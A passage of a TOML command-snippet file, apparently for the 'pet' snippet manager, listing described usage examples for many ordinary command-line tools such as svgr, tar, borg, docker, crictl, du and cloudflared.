  command = "clang <path/to/source.c> -O<1|2|3|fast>"
  output = ""

[[snippets]]
  description = "Transform a SVG file into a React component to `stdout`"
  command = "svgr -- <path/to/file.svg>"
  output = ""

[[snippets]]
  description = "Transform a SVG file into a React component using TypeScript to `stdout`"
  command = "svgr --typescript -- <path/to/file.svg>"
  output = ""

[[snippets]]
  description = "Transform a SVG file into a React component using JSX transform to `stdout`"
  command = "svgr --jsx-runtime automatic -- <path/to/file.svg>"
  output = ""

[[snippets]]
  description = "Transform all SVG files from a directory to React components into a specific directory"
  command = "svgr --out-dir <path/to/output_directory> <path/to/input_directory>"
  output = ""

[[snippets]]
  description = "Transform all SVG files from a directory to React components into a specific directory skipping already transformed files"
  command = "svgr --out-dir <path/to/output_directory> --ignore-existing <path/to/input_directory>"
  output = ""

[[snippets]]
  description = "Transform all SVG files from a directory to React components into a specific directory using a specific case for filenames"
  command = "svgr --out-dir <path/to/output_directory> --filename-case <camel|kebab|pascal> <path/to/input_directory>"
  output = ""

[[snippets]]
  description = "Transform all SVG files from a directory to React components into a specific directory without generating an index file"
  command = "svgr --out-dir <path/to/output_directory> --no-index <path/to/input_directory>"
  output = ""

[[snippets]]
  description = "Register your authentication token"
  command = "expose token <token>"
  output = ""

[[snippets]]
  description = "Share the current working directory"
  command = "expose"
  output = ""

[[snippets]]
  description = "Share the current working directory with a specific subdomain"
  command = "expose --subdomain=<subdomain>"
  output = ""

[[snippets]]
  description = "Share a local URL"
  command = "expose share <url>"
  output = ""

[[snippets]]
  description = "Run the Expose server"
  command = "expose serve"
  output = ""

[[snippets]]
  description = "Run the Expose server with a specific hostname"
  command = "expose serve <hostname>"
  output = ""

[[snippets]]
  description = "Compile a standalone TeX/LaTeX file"
  command = "tectonic -X compile <path/to/file.tex>"
  output = ""

[[snippets]]
  description = "Compile a standalone TeX/LaTeX file with synctex data"
  command = "tectonic -X compile --synctex <path/to/file.tex>"
  output = ""

[[snippets]]
  description = "Initialize a tectonic project in the current directory"
  command = "tectonic -X init"
  output = ""

[[snippets]]
  description = "Initialize a tectonic project in the specified directory"
  command = "tectonic -X new <project_name>"
  output = ""

[[snippets]]
  description = "Build the project in the current directory"
  command = "tectonic -X build"
  output = ""

[[snippets]]
  description = "Start a watcher to build the project in the current directory on change"
  command = "tectonic -X watch"
  output = ""

[[snippets]]
  description = "Create a new Middleman project"
  command = "middleman init ""<project_name>"""
  output = ""

[[snippets]]
  description = "Start local server for current project on port 4567"
  command = "middleman server"
  output = ""

[[snippets]]
  description = "Start local server for current project on a specified port"
  command = "middleman server -p ""<port>"""
  output = ""

[[snippets]]
  description = "Build the project in the current directory to prepare for deployment"
  command = "bundle exec middleman build"
  output = ""

[[snippets]]
  description = "Deploy the Middleman project in the current directory"
  command = "middleman deploy"
  output = ""

[[snippets]]
  description = "Print PDF file fonts information"
  command = "pdffonts <path/to/file.pdf>"
  output = ""

[[snippets]]
  description = "Specify user password for PDF file to bypass security restrictions"
  command = "pdffonts -upw <password> <path/to/file.pdf>"
  output = ""

[[snippets]]
  description = "Specify owner password for PDF file to bypass security restrictions"
  command = "pdffonts -opw <password> <path/to/file.pdf>"
  output = ""

[[snippets]]
  description = "Print additional information on location of the font that will be used when the PDF file is rasterized"
  command = "pdffonts -loc <path/to/file.pdf>"
  output = ""

[[snippets]]
  description = "Print additional information on location of the font that will be used when the PDF file is converted to PostScript"
  command = "pdffonts -locPS <path/to/file.pdf>"
  output = ""

[[snippets]]
  description = "List all TeX Live settings"
  command = "tlmgr option showall"
  output = ""

[[snippets]]
  description = "List all currently set Tex Live settings"
  command = "tlmgr option show"
  output = ""

[[snippets]]
  description = "Print all TeX Live settings in JSON format"
  command = "tlmgr option showall --json"
  output = ""

[[snippets]]
  description = "Show the value of a specific TeX Live setting"
  command = "tlmgr option <setting>"
  output = ""

[[snippets]]
  description = "Modify the value of a specific TeX Live setting"
  command = "tlmgr option <setting> <value>"
  output = ""

[[snippets]]
  description = "Set TeX Live to get future updates from the internet after installing from DVD"
  command = "tlmgr option <repository> <https://mirror.ctan.org/systems/texlive/tlnet>"
  output = ""

[[snippets]]
  description = "Number non-blank lines in a file"
  command = "nl <path/to/file>"
  output = ""

[[snippets]]
  description = "Read from `stdin`"
  command = "<command> | nl -"
  output = ""

[[snippets]]
  description = "Number [a]ll [b]ody lines including blank lines or do [n]ot number body lines"
  command = "nl -b <a|n> <path/to/file>"
  output = ""

[[snippets]]
  description = "Number only the [b]ody lines that match a basic regular expression (BRE) [p]attern"
  command = "nl -b p'FooBar[0-9]' <path/to/file>"
  output = ""

[[snippets]]
  description = "Use a specific [i]ncrement for line numbering"
  command = "nl -i <increment> <path/to/file>"
  output = ""

[[snippets]]
  description = "Specify the line numbering format to [r]ight or [l]eft justified, keeping leading [z]eros or [n]ot"
  command = "nl -n <rz|ln|rn>"
  output = ""

[[snippets]]
  description = "Specify the line numbering's [w]idth (6 by default)"
  command = "nl -w <col_width> <path/to/file>"
  output = ""

[[snippets]]
  description = "Use a specific string to [s]eparate the line numbers from the lines (TAB by default)"
  command = "nl -s <separator> <path/to/file>"
  output = ""

[[snippets]]
  description = "List the sizes of a directory and any subdirectories, in the given unit (B/KiB/MiB)"
  command = "du -<b|k|m> <path/to/directory>"
  output = ""

[[snippets]]
  description = "List the sizes of a directory and any subdirectories, in human-readable form (i.e. auto-selecting the appropriate unit for each size)"
  command = "du -h <path/to/directory>"
  output = ""

[[snippets]]
  description = "Show the size of a single directory, in human-readable units"
  command = "du -sh <path/to/directory>"
  output = ""

[[snippets]]
  description = "List the human-readable sizes of a directory and of all the files and directories within it"
  command = "du -ah <path/to/directory>"
  output = ""

[[snippets]]
  description = "List the human-readable sizes of a directory and any subdirectories, up to N levels deep"
  command = "du -h --max-depth=N <path/to/directory>"
  output = ""

[[snippets]]
  description = "List the human-readable size of all `.jpg` files in subdirectories of the current directory, and show a cumulative total at the end"
  command = "du -ch <*/*.jpg>"
  output = ""

[[snippets]]
  description = "Read a Biorad confocal file and store the n'th image contained in it to as a PGM file"
  command = "bioradtopgm -<n> <path/to/file.pic> > <path/to/file.pgm>"
  output = ""

[[snippets]]
  description = "Read a Biorad confocal file and print the number of images it contains"
  command = "bioradtopgm <path/to/file.pic>"
  output = ""

[[snippets]]
  description = "Display version"
  command = "bioradtopgm -version"
  output = ""

[[snippets]]
  description = "Convert a JPEG file to AVIF, saving it to `file.avif`"
  command = "cavif <path/to/image.jpg>"
  output = ""

[[snippets]]
  description = "Adjust the image quality and convert a PNG file to AVIF"
  command = "cavif --quality <1..100> <path/to/image.png>"
  output = ""

[[snippets]]
  description = "Specify the output location"
  command = "cavif <path/to/image.jpg> --output <path/to/output.avif>"
  output = ""

[[snippets]]
  description = "Overwrite the destination file if it already exists"
  command = "cavif --overwrite <path/to/image.jpg>"
  output = ""

[[snippets]]
  description = "Search for files containing a string or regular expression in the current directory recursively"
  command = "ack ""<search_pattern>"""
  output = ""

[[snippets]]
  description = "Search for a case-insensitive pattern"
  command = "ack --ignore-case ""<search_pattern>"""
  output = ""

[[snippets]]
  description = "Search for lines matching a pattern, printing [o]nly the matched text and not the rest of the line"
  command = "ack -o ""<search_pattern>"""
  output = ""

[[snippets]]
  description = "Limit search to files of a specific type"
  command = "ack --type=<ruby> ""<search_pattern>"""
  output = ""

[[snippets]]
  description = "Do not search in files of a specific type"
  command = "ack --type=no<ruby> ""<search_pattern>"""
  output = ""

[[snippets]]
  description = "Count the total number of matches found"
  command = "ack --count --no-filename ""<search_pattern>"""
  output = ""

[[snippets]]
  description = "Print the file names and the number of matches for each file only"
  command = "ack --count --files-with-matches ""<search_pattern>"""
  output = ""

[[snippets]]
  description = "List all the values that can be used with `--type`"
  command = "ack --help-types"
  output = ""

[[snippets]]
  description = "Invite the given user or team as an owner"
  command = "cargo owner --add <username|github:org_name:team_name> <crate>"
  output = ""

[[snippets]]
  description = "Remove the given user or team as an owner"
  command = "cargo owner --remove <username|github:org_name:team_name> <crate>"
  output = ""

[[snippets]]
  description = "List owners of a crate"
  command = "cargo owner --list <crate>"
  output = ""

[[snippets]]
  description = "Use the specified registry (registry names can be defined in the configuration - the default is <https://crates.io>)"
  command = "cargo owner --registry <name>"
  output = ""

[[snippets]]
  description = "Convert PPM image to PGM image"
  command = "ppmtopgm <path/to/file.ppm> > <path/to/file.pgm>"
  output = ""

[[snippets]]
  description = "Display version"
  command = "ppmtopgm -version"
  output = ""

[[snippets]]
  description = "Print the value of a Git logical variable"
  command = "git var <GIT_AUTHOR_IDENT|GIT_COMMITTER_IDENT|GIT_EDITOR|GIT_PAGER>"
  output = ""

[[snippets]]
  description = "[l]ist all Git logical variables"
  command = "git var -l"
  output = ""

[[snippets]]
  description = "Add or override the IFACE.PROG record and run the update scripts if updating is enabled"
  command = "resolvconf -a <IFACE.PROG>"
  output = ""

[[snippets]]
  description = "Delete the IFACE.PROG record and run the update scripts if updating is enabled"
  command = "resolvconf -d <IFACR.PROG>"
  output = ""

[[snippets]]
  description = "Just run the update scripts if updating is enabled"
  command = "resolvconf -u"
  output = ""

[[snippets]]
  description = "Set the flag indicating whether `resolvconf` should run update scripts when invoked with `-a`, `-d` or `-u`"
  command = "resolvconf --enable-updates"
  output = ""

[[snippets]]
  description = "Clear the flag indicating whether to run updates"
  command = "resolvconf --disable-updates"
  output = ""

[[snippets]]
  description = "Check whether updates are enabled"
  command = "resolvconf --updates-are-enabled"
  output = ""

[[snippets]]
  description = "List all kubernetes pods (Ready and NotReady)"
  command = "crictl pods"
  output = ""

[[snippets]]
  description = "List all containers (Running and Exited)"
  command = "crictl ps --all"
  output = ""

[[snippets]]
  description = "List all images"
  command = "crictl images"
  output = ""

[[snippets]]
  description = "Print information about specific containers"
  command = "crictl inspect <container_id1 container_id2 ...>"
  output = ""

[[snippets]]
  description = "Open a specific shell inside a running container"
  command = "crictl exec -it <container_id> <sh>"
  output = ""

[[snippets]]
  description = "Pull a specific image from a registry"
  command = "crictl pull <image:tag>"
  output = ""

[[snippets]]
  description = "Print and [f]ollow logs of a specific container"
  command = "crictl logs -f <container_id>"
  output = ""

[[snippets]]
  description = "Remove one or more images"
  command = "crictl rmi <image_id1 image_id2 ...>"
  output = ""

[[snippets]]
  description = "Read a PGM image, apply dithering and save it to a file"
  command = "ppmditherbw <path/to/image.pgm> > <path/to/file.pgm>"
  output = ""

[[snippets]]
  description = "Use the specified quantization method"
  command = "ppmditherbw -<floyd|fs|atkinson|threshold|hilbert|...> <path/to/image.pgm> > <path/to/file.pgm>"
  output = ""

[[snippets]]
  description = "Use the atkinson quantization method and the specified seed for a pseudo-random number generator"
  command = "ppmditherbw -atkinson -randomseed <1337> <path/to/image.pgm> > <path/to/file.pgm>"
  output = ""

[[snippets]]
  description = "Specify the thresholding value for quantization methods that perform some sort of thresholding"
  command = "ppmditherbw -<fs|atkinson|thresholding> -value <0.3> <path/to/image.pgm> > <path/to/file.pgm>"
  output = ""

[[snippets]]
  description = "Initialize a (local) repository"
  command = "borg init <path/to/repo_directory>"
  output = ""

[[snippets]]
  description = "Backup a directory into the repository, creating an archive called "Monday""
  command = "borg create --progress <path/to/repo_directory>::<Monday> <path/to/source_directory>"
  output = ""

[[snippets]]
  description = "List all archives in a repository"
  command = "borg list <path/to/repo_directory>"
  output = ""

[[snippets]]
  description = "Extract a specific directory from the "Monday" archive in a remote repository, excluding all `*.ext` files"
  command = "borg extract <user>@<host>:<path/to/repo_directory>::<Monday> <path/to/target_directory> --exclude '<*.ext>'"
  output = ""

[[snippets]]
  description = "Prune a repository by deleting all archives older than 7 days, listing changes"
  command = "borg prune --keep-within <7d> --list <path/to/repo_directory>"
  output = ""

[[snippets]]
  description = "Mount a repository as a FUSE filesystem"
  command = "borg mount <path/to/repo_directory>::<Monday> <path/to/mountpoint>"
  output = ""

[[snippets]]
  description = "Display help on creating archives"
  command = "borg create --help"
  output = ""

[[snippets]]
  description = "List all nvme devices"
  command = "sudo nvme list"
  output = ""

[[snippets]]
  description = "Show device information"
  command = "sudo nvme smart-log <device>"
  output = ""

[[snippets]]
  description = "Send a typed email message. The command-line below continues after pressing Enter key. Input CC email-id (optional) press Enter key. Input message text (can be multiline). Press Ctrl-D key to complete the message text"
  command = "mail --subject=""<subject line>"" <to_user@example.com>"
  output = ""

[[snippets]]
  description = "Send an email that contains file content"
  command = "mail --subject=""<$HOSTNAME filename.txt>"" <to_user@example.com> < <path/to/filename.txt>"
  output = ""

[[snippets]]
  description = "Send a `tar.gz` file as an attachment"
  command = "tar cvzf - <path/to/directory1 path/to/directory2> | uuencode <data.tar.gz> | mail --subject=""<subject_line>"" <to_user@example.com>"
  output = ""

[[snippets]]
  description = "Hide mouse cursor after 3 seconds"
  command = "unclutter -idle <3>"
  output = ""

[[snippets]]
  description = "Download a prebuilt binary for the current system from a repository on GitHub"
  command = "eget <zyedidia/micro>"
  output = ""

[[snippets]]
  description = "Download from a URL"
  command = "eget <https://go.dev/dl/go1.17.5.linux-amd64.tar.gz>"
  output = ""

[[snippets]]
  description = "Specify the location to place the downloaded files"
  command = "eget <zyedidia/micro> --to=<path/to/directory>"
  output = ""

[[snippets]]
  description = "Specify a Git tag instead of using the latest version"
  command = "eget <zyedidia/micro> --tag=<v2.0.10>"
  output = ""

[[snippets]]
  description = "Install the latest pre-release instead of the latest stable version"
  command = "eget <zyedidia/micro> --pre-release"
  output = ""

[[snippets]]
  description = "Only download the asset, skipping extraction"
  command = "eget <zyedidia/micro> --download-only"
  output = ""

[[snippets]]
  description = "Only download if there is a newer release then the currently downloaded version"
  command = "eget <zyedidia/micro> --upgrade-only"
  output = ""

[[snippets]]
  description = "Test the package found in the current directory"
  command = "go test"
  output = ""

[[snippets]]
  description = "[v]erbosely test the package in the current directory"
  command = "go test -v"
  output = ""

[[snippets]]
  description = "Test the packages in the current directory and all subdirectories (note the `...`)"
  command = "go test -v ./..."
  output = ""

[[snippets]]
  description = "Test the package in the current directory and run all benchmarks"
  command = "go test -v -bench ."
  output = ""

[[snippets]]
  description = "Test the package in the current directory and run all benchmarks for 50 seconds"
  command = "go test -v -bench . -benchtime <50s>"
  output = ""

[[snippets]]
  description = "Test the package with coverage analysis"
  command = "go test -cover"
  output = ""

[[snippets]]
  description = "Check how GIFs differ"
  command = "gifdiff <path/to/first.gif> <path/to/second.gif>"
  output = ""

[[snippets]]
  description = "Check if GIFs differ"
  command = "gifdiff --brief <path/to/first.gif> <path/to/second.gif>"
  output = ""

[[snippets]]
  description = "Show resources in the current project"
  command = "list resources;"
  output = ""

[[snippets]]
  description = "Add file resource"
  command = "add file <filename> as <alias>;"
  output = ""

[[snippets]]
  description = "Add archive resource"
  command = "add archive <archive.tar.gz> as <alias>;"
  output = ""

[[snippets]]
  description = "Add .jar resource"
  command = "add jar <package.jar>;"
  output = ""

[[snippets]]
  description = "Add .py resource"
  command = "add py <script.py>;"
  output = ""

[[snippets]]
  description = "Delete resource"
  command = "drop resource <resource_name>;"
  output = ""

[[snippets]]
  description = "Generate a Psalm configuration"
  command = "psalm --init"
  output = ""

[[snippets]]
  description = "Analyze the current working directory"
  command = "psalm"
  output = ""

[[snippets]]
  description = "Analyze a specific directory or file"
  command = "psalm <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Analyze a project with a specific configuration file"
  command = "psalm --config <path/to/psalm.xml>"
  output = ""

[[snippets]]
  description = "Include informational findings in the output"
  command = "psalm --show-info"
  output = ""

[[snippets]]
  description = "Analyze a project and display statistics"
  command = "psalm --stats"
  output = ""

[[snippets]]
  description = "Analyze a project in parallel with 4 threads"
  command = "psalm --threads <4>"
  output = ""

[[snippets]]
  description = "Print a file to the console in rainbow colors"
  command = "lolcat <path/to/file>"
  output = ""

[[snippets]]
  description = "Print the result of a text-producing command in rainbow colors"
  command = "<fortune> | lolcat"
  output = ""

[[snippets]]
  description = "Print a file to the console with animated rainbow colors"
  command = "lolcat -a <path/to/file>"
  output = ""

[[snippets]]
  description = "Print a file to the console with 24-bit (truecolor) rainbow colors"
  command = "lolcat -t <path/to/file>"
  output = ""

[[snippets]]
  description = "Process input with equations, saving the output for future typesetting with groff to PostScript"
  command = "eqn <path/to/input.eqn> > <path/to/output.roff>"
  output = ""

[[snippets]]
  description = "Typeset an input file with equations to PDF using the [me] macro package"
  command = "eqn -T <pdf> <path/to/input.eqn> | groff -<me> -T <pdf> > <path/to/output.pdf>"
  output = ""

[[snippets]]
  description = "Start an interactive shell session"
  command = "sh"
  output = ""

[[snippets]]
  description = "Execute a command and then exit"
  command = "sh -c ""<command>"""
  output = ""

[[snippets]]
  description = "Execute a script"
  command = "sh <path/to/script.sh>"
  output = ""

[[snippets]]
  description = "Read and execute commands from `stdin`"
  command = "sh -s"
  output = ""

[[snippets]]
  description = "Grep a pattern in a compressed file (case-sensitive)"
  command = "zgrep <pattern> <path/to/compressed/file>"
  output = ""

[[snippets]]
  description = "Grep a pattern in a compressed file (case-insensitive)"
  command = "zgrep -i <pattern> <path/to/compressed/file>"
  output = ""

[[snippets]]
  description = "Output count of lines containing matched pattern in a compressed file"
  command = "zgrep -c <pattern> <path/to/compressed/file>"
  output = ""

[[snippets]]
  description = "Display the lines which don’t have the pattern present (Invert the search function)"
  command = "zgrep -v <pattern> <path/to/compressed/file>"
  output = ""

[[snippets]]
  description = "Grep a compressed file for multiple patterns"
  command = "zgrep -e ""<pattern_1>"" -e ""<pattern_2>"" <path/to/compressed/file>"
  output = ""

[[snippets]]
  description = "Use extended regular expressions (supporting `?`, `+`, `{}`, `()` and `|`)"
  command = "zgrep -E <regular_expression> <path/to/file>"
  output = ""

[[snippets]]
  description = "Print 3 lines of [C]ontext around, [B]efore, or [A]fter each match"
  command = "zgrep -<C|B|A> <3> <pattern> <path/to/compressed/file>"
  output = ""

[[snippets]]
  description = "Concatenate all PDF files into one"
  command = "sam2p *.pdf <path/to/output.pdf>"
  output = ""

[[snippets]]
  description = "Start a Tetris game"
  command = "bastet"
  output = ""

[[snippets]]
  description = "Navigate the piece horizontally"
  command = "<Left|Right arrow key>"
  output = ""

[[snippets]]
  description = "Rotate the piece clockwise or counterclockwise"
  command = "<Spacebar|Up arrow key>"
  output = ""

[[snippets]]
  description = "Soft drop the piece"
  command = "<Down arrow key>"
  output = ""

[[snippets]]
  description = "Hard drop the piece"
  command = "<Enter>"
  output = ""

[[snippets]]
  description = "Pause the game"
  command = "p"
  output = ""

[[snippets]]
  description = "Quit the game"
  command = "<Ctrl> + C"
  output = ""

[[snippets]]
  description = "Display currently logged username"
  command = "whoami"
  output = ""

[[snippets]]
  description = "Display the username after a change in the user ID"
  command = "sudo whoami"
  output = ""

[[snippets]]
  description = "Copy a disk to a raw image file and hash the image using SHA256"
  command = "dcfldd if=/dev/<disk_device> of=<file.img> hash=sha256 hashlog=<file.hash>"
  output = ""

[[snippets]]
  description = "Copy a disk to a raw image file, hashing each 1 GB chunk"
  command = "dcfldd if=/dev/<disk_device> of=<file.img> hash=<sha512|sha384|sha256|sha1|md5> hashlog=<file.hash> hashwindow=<1G>"
  output = ""

[[snippets]]
  description = "Create a table"
  command = "aws dynamodb create-table --table-name <table_name> --attribute-definitions <AttributeName=S,AttributeType=S> --key-schema <AttributeName=S,KeyType=HASH> --provisioned-throughput <ReadCapacityUnits=5,WriteCapacityUnits=5>"
  output = ""

[[snippets]]
  description = "List all tables in the DynamoDB"
  command = "aws dynamodb list-tables"
  output = ""

[[snippets]]
  description = "Get details about a specific table"
  command = "aws dynamodb describe-table --table-name <table_name>"
  output = ""

[[snippets]]
  description = "Add an item to a table"
  command = "aws dynamodb put-item --table-name <table_name> --item '<{""AttributeName"": {""S"": ""value"">>'"
  output = ""

[[snippets]]
  description = "Retrieve an item from a table"
  command = "aws dynamodb get-item --table-name <table_name> --key '<{""ID"": {""N"": ""1"">>'"
  output = ""

[[snippets]]
  description = "Update an item in the table"
  command = "aws dynamodb update-item --table-name <table_name> --key '<{""ID"": {""N"": ""1"">>' --update-expression ""<SET Name = :n>"" --expression-attribute-values '<{"":n"": {""S"": ""Jane"">>'"
  output = ""

[[snippets]]
  description = "Scan items in the table"
  command = "aws dynamodb scan --table-name <table_name>"
  output = ""

[[snippets]]
  description = "Delete an item from the table"
  command = "aws dynamodb delete-item --table-name <table_name> --key '<{""ID"": {""N"": ""1"">>'"
  output = ""

[[snippets]]
  description = "Run a JavaScript file"
  command = "node <path/to/file>"
  output = ""

[[snippets]]
  description = "Start a REPL (interactive shell)"
  command = "node"
  output = ""

[[snippets]]
  description = "Execute the specified file restarting the process when an imported file is changed (requires Node.js version 18.11+)"
  command = "node --watch <path/to/file>"
  output = ""

[[snippets]]
  description = "Evaluate JavaScript code by passing it as an argument"
  command = "node -e ""<code>"""
  output = ""

[[snippets]]
  description = "Evaluate and print the result, useful to print node's dependencies versions"
  command = "node -p ""process.versions"""
  output = ""

[[snippets]]
  description = "Activate inspector, pausing execution until a debugger is connected once source code is fully parsed"
  command = "node --no-lazy --inspect-brk <path/to/file>"
  output = ""

[[snippets]]
  description = "Initialize `hut`'s configuration file (this will prompt for an OAuth2 access token, which is required to use `hut`)"
  command = "hut init"
  output = ""

[[snippets]]
  description = "List Git/Mercurial repositories"
  command = "hut <git|hg> list"
  output = ""

[[snippets]]
  description = "Create a public Git/Mercurial repository"
  command = "hut <git|hg> create <name>"
  output = ""

[[snippets]]
  description = "List jobs on <https://builds.sr.ht>"
  command = "hut builds list"
  output = ""

[[snippets]]
  description = "Show the status of a job"
  command = "hut builds show <job_id>"
  output = ""

[[snippets]]
  description = "SSH into a job container"
  command = "hut ssh <job_id>"
  output = ""

[[snippets]]
  description = "Start an interactive shell of `tlmgr`"
  command = "tlmgr shell"
  output = ""

[[snippets]]
  description = "Run any `tlmgr` subcommand in the interactive shell"
  command = "<subcommand> <arguments>"
  output = ""

[[snippets]]
  description = "Quit the interactive shell"
  command = "quit"
  output = ""

[[snippets]]
  description = "List all TeX Live variables"
  command = "get"
  output = ""

[[snippets]]
  description = "Get the value of a TeX Live variable"
  command = "get <variable>"
  output = ""

[[snippets]]
  description = "Set the value of a TeX Live variable"
  command = "set <variable> <value>"
  output = ""

[[snippets]]
  description = "Restart the interactive shell"
  command = "restart"
  output = ""

[[snippets]]
  description = "Display the version of the current protocol"
  command = "protocol"
  output = ""

[[snippets]]
  description = "[c]reate an archive and write it to a [f]ile"
  command = "tar cf <path/to/target.tar> <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "[c]reate a g[z]ipped archive and write it to a [f]ile"
  command = "tar czf <path/to/target.tar.gz> <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "[c]reate a g[z]ipped archive from a directory using relative paths"
  command = "tar czf <path/to/target.tar.gz> --directory=<path/to/directory> ."
  output = ""

[[snippets]]
  description = "E[x]tract a (compressed) archive [f]ile into the current directory [v]erbosely"
  command = "tar xvf <path/to/source.tar[.gz|.bz2|.xz]>"
  output = ""

[[snippets]]
  description = "E[x]tract a (compressed) archive [f]ile into the target directory"
  command = "tar xf <path/to/source.tar[.gz|.bz2|.xz]> --directory=<path/to/directory>"
  output = ""

[[snippets]]
  description = "[c]reate a compressed archive and write it to a [f]ile, using the file extension to [a]utomatically determine the compression program"
  command = "tar caf <path/to/target.tar.xz> <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Lis[t] the contents of a `tar` [f]ile [v]erbosely"
  command = "tar tvf <path/to/source.tar>"
  output = ""

[[snippets]]
  description = "E[x]tract files matching a pattern from an archive [f]ile"
  command = "tar xf <path/to/source.tar> --wildcards ""<*.html>"""
  output = ""

[[snippets]]
  description = "Print how long the current user has been connected in hours"
  command = "ac"
  output = ""

[[snippets]]
  description = "Print how long users have been connected in hours"
  command = "ac -p"
  output = ""

[[snippets]]
  description = "Print how long a particular user has been connected in hours"
  command = "ac -p <username>"
  output = ""

[[snippets]]
  description = "Print how long a particular user has been connected in hours per [d]ay (with total)"
  command = "ac -dp <username>"
  output = ""

[[snippets]]
  description = "Convert a graph from `gv` to `gml` format"
  command = "gv2gml -o <output.gml> <input.gv>"
  output = ""

[[snippets]]
  description = "Convert a graph using `stdin` and `stdout`"
  command = "cat <input.gv> | gv2gml > <output.gml>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "gv2gml -?"
  output = ""

[[snippets]]
  description = "Run a `doctl databases sql-mode` command with an access token"
  command = "doctl databases sql-mode <command> --access-token <access_token>"
  output = ""

[[snippets]]
  description = "Get a MySQL database cluster's SQL modes"
  command = "doctl databases sql-mode get <database_id>"
  output = ""

[[snippets]]
  description = "Overwrite a MySQL database cluster's SQL modes to the specified modes"
  command = "doctl databases sql-mode set <database_id> <sql_mode_1 sql_mode_2 ...>"
  output = ""

[[snippets]]
  description = "Search for packages"
  command = "cargo search <query>"
  output = ""

[[snippets]]
  description = "Show `n` results (default: 10, max: 100)"
  command = "cargo search --limit <n> <query>"
  output = ""

[[snippets]]
  description = "Authenticate and associate the connection to a domain in the Cloudflare account"
  command = "cloudflared tunnel login"
  output = ""

[[snippets]]
  description = "Create a tunnel with a specific name"
  command = "cloudflared tunnel create <name>"
  output = ""

[[snippets]]
  description = "Establish a tunnel to a host in Cloudflare from the local server"
  command = "cloudflared tunnel --hostname <hostname> localhost:<port_number>"
  output = ""

[[snippets]]
  description = "Establish a tunnel to a host in Cloudflare from the local server, without verifying the local server's certificate"
  command = "cloudflared tunnel --hostname <hostname> localhost:<port_number> --no-tls-verify"
  output = ""

[[snippets]]
  description = "Save logs to a file"
  command = "cloudflared tunnel --hostname <hostname> http://localhost:<port_number> --loglevel <panic|fatal|error|warn|info|debug> --logfile <path/to/file>"
  output = ""

[[snippets]]
  description = "Install cloudflared as a system service"
  command = "cloudflared service install"
  output = ""

[[snippets]]
  description = "Print the lines where a specific column is numerically equal to a given number"
  command = "tsv-filter -H --eq <field_name>:<number> <path/to/tsv_file>"
  output = ""

[[snippets]]
  description = "Print the lines where a specific column is [eq]ual/[n]on [e]qual/[l]ess [t]han/[l]ess than or [e]qual/[g]reater [t]han/[g]reater than or [e]qual to a given number"
  command = "tsv-filter --<eq|ne|lt|le|gt|ge> <column_number>:<number> <path/to/tsv_file>"
  output = ""

[[snippets]]
  description = "Print the lines where a specific column is [eq]ual/[n]ot [e]qual/part of/not part of a given string"
  command = "tsv-filter --str-<eq|ne|in-fld|not-in-fld> <column_number>:<string> <path/to/tsv_file>"
  output = ""

[[snippets]]
  description = "Filter for non-empty fields"
  command = "tsv-filter --not-empty <column_number> <path/to/tsv_file>"
  output = ""

[[snippets]]
  description = "Print the lines where a specific column is empty"
  command = "tsv-filter --invert --not-empty <column_number> <path/to/tsv_file>"
  output = ""

[[snippets]]
  description = "Print the lines that satisfy two conditions"
  command = "tsv-filter --eq <column_number1>:<number> --str-eq <column_number2>:<string> <path/to/tsv_file>"
  output = ""

[[snippets]]
  description = "Print the lines that match at least one condition"
  command = "tsv-filter --or --eq <column_number1>:<number> --str-eq <column_number2>:<string> <path/to/tsv_file>"
  output = ""

[[snippets]]
  description = "Count matching lines, interpreting first line as a [H]eader"
  command = "tsv-filter --count -H --eq <field_name>:<number> <path/to/tsv_file>"
  output = ""

[[snippets]]
  description = "Start Midnight Commander"
  command = "mc"
  output = ""

[[snippets]]
  description = "Start Midnight Commander in black and white"
  command = "mc -b"
  output = ""

[[snippets]]
  description = "List all aliases"
  command = "alias"
  output = ""

[[snippets]]
  description = "Create a generic alias"
  command = "alias <word>=""<command>"""
  output = ""

[[snippets]]
  description = "View the command associated to a given alias"
  command = "alias <word>"
  output = ""

[[snippets]]
  description = "Remove an aliased command"
  command = "unalias <word>"
  output = ""

[[snippets]]
  description = "Turn `rm` into an interactive command"
  command = "alias <rm>=""<rm --interactive>"""
  output = ""

[[snippets]]
  description = "Create `la` as a shortcut for `ls --all`"
  command = "alias <la>=""<ls --all>"""
  output = ""

[[snippets]]
  description = "Scale an image such that the result has the specified dimensions"
  command = "pamscale -width <width> -height <height> <path/to/input.pam> > <path/to/output.pam>"
  output = ""

[[snippets]]
  description = "Scale an image such that the result has the specified width, keeping the aspect ratio"
  command = "pamscale -width <width> <path/to/input.pam> > <path/to/output.pam>"
  output = ""

[[snippets]]
  description = "Scale an image such that its width and height is changed by the specified factors"
  command = "pamscale -xscale <x_factor> -yscale <y_factor> <path/to/input.pam> > <path/to/output.pam>"
  output = ""

[[snippets]]
  description = "Scale an image such that it fits into the specified bounding box while preserving its aspect ratio"
  command = "pamscale -xyfit <bbox_width> <bbox_height> <path/to/input.pam> > <path/to/output.pam>"
  output = ""

[[snippets]]
  description = "Scale an image such that it completely fills the specified box while preserving its aspect ratio"
  command = "pamscale -xyfill <box_width> <box_height> <path/to/input.pam> > <path/to/output.pam>"
  output = ""

[[snippets]]
  description = "List the contexts"
  command = "kubectx"
  output = ""

[[snippets]]
  description = "Switch to a named context"
  command = "kubectx <name>"
  output = ""

[[snippets]]
  description = "Switch to the previous context"
  command = "kubectx -"
  output = ""

[[snippets]]
  description = "Delete a named context"
  command = "kubectx -d <name>"
  output = ""

[[snippets]]
  description = "List all docker containers (running and stopped)"
  command = "docker ps --all"
  output = ""

[[snippets]]
  description = "Start a container from an image, with a custom name"
  command = "docker run --name <container_name> <image>"
  output = ""

[[snippets]]
  description = "Start or stop an existing container"
  command = "docker <start|stop> <container_name>"
  output = ""

[[snippets]]
  description = "Pull an image from a docker registry"
  command = "docker pull <image>"
  output = ""

[[snippets]]
  description = "Display the list of already downloaded images"
  command = "docker images"
  output = ""

[[snippets]]
  description = "Open a shell inside a running container"
  command = "docker exec -it <container_name> <sh>"
  output = ""

[[snippets]]
  description = "Remove a stopped container"
  command = "docker rm <container_name>"
  output = ""

[[snippets]]
  description = "Fetch and follow the logs of a container"
